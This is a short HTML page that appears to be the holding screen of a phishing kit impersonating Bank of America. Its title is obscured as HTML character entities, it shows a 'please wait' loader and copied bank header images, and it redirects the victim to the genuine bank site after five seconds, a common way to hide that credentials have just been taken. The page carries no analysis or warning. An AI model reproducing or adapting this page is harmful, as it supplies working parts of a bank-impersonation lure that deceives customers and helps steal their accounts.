<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#87;&#97;&#105;&#116;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <html><meta http-equiv="Refresh" content="05; url=https://www.bankofamerica.com/"></html>
<style type="text/css">
div#container
{
	position:relative;
	width: 1215px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div id="container">
<div class="loader"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:128px; top:23px; width:230px; height:38px; z-index:0"></div>

<div id="image2" style="position:absolute; overflow:hidden; left:122px; top:75px; width:968px; height:20px; z-index:1"><img src="images/bo11.png" alt="" title="" border=0 width=968 height=20></div>

<div id="image3" style="position:absolute; overflow:hidden; left:398px; top:130px; width:274px; height:51px; z-index:2"><img src="images/ba21.png" alt="" title="" border=0 width=274 height=51></div>

<div id="image6" style="position:absolute; overflow:hidden; left:467px; top:253px; width:150px; height:150px; z-index:5"><img src="images/wait.gif" alt="" title="" border=0 width=150 height=150></div>

</div>

</body>
</html>
